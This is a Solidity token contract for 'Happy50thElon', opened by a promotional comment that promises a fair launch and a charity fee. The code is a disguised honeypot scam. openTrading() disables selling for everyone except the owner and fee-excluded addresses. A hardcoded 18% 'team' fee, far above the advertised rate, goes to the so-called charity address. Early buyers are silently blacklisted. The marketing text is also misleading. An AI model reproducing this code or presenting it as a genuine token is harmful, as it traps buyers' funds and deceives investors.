/**
 *Submitted for verification at Etherscan.io on 2021-06-28
*/

/**

    Let's celebrate the 50th birthday of Elon Musk!

    He's the owner of several companies of SpaceX, Tesla, The Boring Company, OpenAI, Neuralink and Happy50thElon!

    For supporting a Elon Musk, we are going to launch the new token in the 11 AM of 28th June EST timezone.

    🍰 No presale, No team tokens
    🎂 No buy limit, No cooldown
    🥮 Fair Launch
    🍰 Liquidity will lock right after the launch
    🎂 Not welcome sniping bots
    🥮 Contract will announce in 15 ~ 20 minutes after the launch

    ☎️ Telegram: https://t.me/happy50elon
    📱 Twitter:  https://twitter.com/elonmusk
    🗓 Countdown:https://www.timeanddate.com/countdown/birthday?iso=20210628T08&p0=822&msg=Happy+50th+Elon+Musk&font=cursive

    Chat will unmute after renounce.


___________________§§§§§§
_____________§§§§__§§__§§_§§§§§§
_____§§__§§_§§__§§_§§§§§§_§§__§§_§§____§§
_____§§__§§_§§§§§§_§§_____§§§§§§__§§__§§
_____§§§§§§_§§__§§_§§_____§§_______§§§§
_____§§__§§_§§__§§________§§________§§
_____§§__§§_________________________§§

_______§§§§§§___§§__§§§§§__§§§§§§_§§__§§
_______§§___§§__§§__§§__§§___§§___§§__§§
_______§§§§§§___§§__§§§§§____§§___§§§§§§
_______§§___§§__§§__§§_§§____§§___§§__§§
_______§§§§§§___§§__§§__§§___§§___§§__§§

__________§§§§§§§__________§§____§§
___________§§___§§___§§§§§__§§__§§
___________§§___§§__§§___§§__§§§§
___________§§___§§__§§§§§§§___§§
__________§§§§§§§___§§___§§___§§
____________________§§___§§
________________¶¶
_______________¶¶¶¶_______________¶¶
______________¶¶S¶¶______¶¶_____¶¶¶¶
_____________¶¶SS¶_____¶¶¶¶____¶¶SS¶
_____________¶¶S¶¶____¶¶SS¶___¶¶SS¶¶
______________¶¶______¶SS¶_____¶SS¶
_____________¶¶¶¶¶_____¶¶_______¶¶
_____________¶__¶¶____¶¶¶¶¶____¶¶¶¶¶
_____________¶__¶¶____¶__¶¶____¶__¶¶
_____________¶__¶_____¶__¶¶____¶__¶¶
_____________¶__¶_____¶__¶¶____¶__¶
_____________¶__¶_____¶__¶_____¶__¶
___________¶¶¶__¶¶¶¶¶¶¶__¶¶¶¶¶¶¶__¶
________¶¶¶¶¶¶__¶11111¶__¶11111¶__¶¶¶¶
______¶¶¶1111¶__¶11111¶__¶11111¶__¶11¶¶¶¶
_____¶¶111$11¶¶¶¶11111¶__¶11111¶¶¶¶11$11¶¶¶
____¶¶111$$$$11111$111¶¶¶¶11$1111111$$$$11¶¶
____¶¶¶¶111$11111$$$$111111$$$$1111111$11¶¶¶
____¶__¶¶¶¶¶¶¶¶1111$111111111$1111111¶¶¶¶¶_¶
___¶¶______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶
_¶¶¶¶_____§§________________________§§__¶¶11¶¶
¶¶11¶¶__§§_§§___§§_____§§____§§___§§_§§_¶¶111¶
¶111¶¶¶___§§___§§_§§__§§_§§_§§_§§___§§_¶¶¶111¶
¶1111¶¶¶¶________§§_____§§____§§_____¶¶¶¶111¶¶
¶¶¶¶111¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶
__¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111¶¶¶
____¶¶¶11111111111111111111111111111111111¶¶
_____¶¶¶¶111¶¶¶¶11111111¶¶11111111¶¶¶¶1111¶¶
______¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶1111¶¶¶_¶¶¶¶¶¶¶
_______________¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶
*/


// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Happy50thElon is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Happy 50th Elon | t.me/happy50elon";
    string private constant _symbol = "Happy50Elon \xF0\x9F\x8E\x82";
    uint8 private constant _decimals = 9;

    // RFI
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _taxFee = 2;
    uint256 private _charityFee = 3;

    // Bot detection
    mapping(address => bool) private bots;
    mapping(address => uint256) private cooldown;
    address payable private _charityAddress;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;
    bool private sellEnabled = true;
    uint256 private _maxTxAmount = _tTotal;
    uint256 public launchBlock;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address payable addr1) {
        _charityAddress = addr1;
        _rOwned[_msgSender()] = _rTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_charityAddress] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function setCooldownEnabled(bool onoff) external onlyOwner() {
        cooldownEnabled = onoff;
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function removeAllFee() private {
        if (_taxFee == 0 && _charityFee == 0) return;
        _taxFee = 0;
        _charityFee = 0;
    }

    function restoreAllFee() private {
        _taxFee = 2;
        _charityFee = 3;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (cooldownEnabled) {
                if (
                    from != address(this) &&
                    to != address(this) &&
                    from != address(uniswapV2Router) &&
                    to != address(uniswapV2Router)
                ) {
                    require(
                        _msgSender() == address(uniswapV2Router) ||
                            _msgSender() == uniswapV2Pair,
                        "ERR: Uniswap only"
                    );
                }
            }
            require(amount <= _maxTxAmount);
            require(!bots[from] && !bots[to] && !bots[msg.sender]);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to] &&
                cooldownEnabled
            ) {
                require(cooldown[to] < block.timestamp);
                cooldown[to] = block.timestamp + (30 seconds);
            }

            if (block.number <= launchBlock + 3) {
                if (from != uniswapV2Pair && from != address(uniswapV2Router)) {
                    bots[from] = true;
                } else if (to != uniswapV2Pair && to != address(uniswapV2Router)) {
                    bots[to] = true;
                }
            }
            
            if (to == uniswapV2Pair) {
                require(sellEnabled, "Sell is not enabled");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && from != uniswapV2Pair && swapEnabled) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function isExcluded(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function isBlackListed(address account) public view returns (bool) {
        return bots[account];
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _charityAddress.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        IUniswapV2Router02 _uniswapV2Router =
            IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        cooldownEnabled = false;
        _maxTxAmount = 1000000000000 * 10**9;
        launchBlock = block.number;
        tradingOpen = true;
        sellEnabled = false;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function manualswap() external {
        require(_msgSender() == _charityAddress);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() external {
        require(_msgSender() == _charityAddress);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function setBots(address[] memory bots_) public onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBot(address notbot) public onlyOwner {
        bots[notbot] = false;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreAllFee();
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeTeam(tTeam);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    receive() external payable {}

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _taxFee, 18);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 taxFee,
        uint256 TeamFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(taxFee).div(100);
        uint256 tTeam = tAmount.mul(TeamFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        require(maxTxPercent > 0, "Amount must be greater than 0");
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(10**2);
        emit MaxTxAmountUpdated(_maxTxAmount);
    }
    
    function setSellEnabled(bool onoff) external onlyOwner() {
        sellEnabled = onoff;
    }
}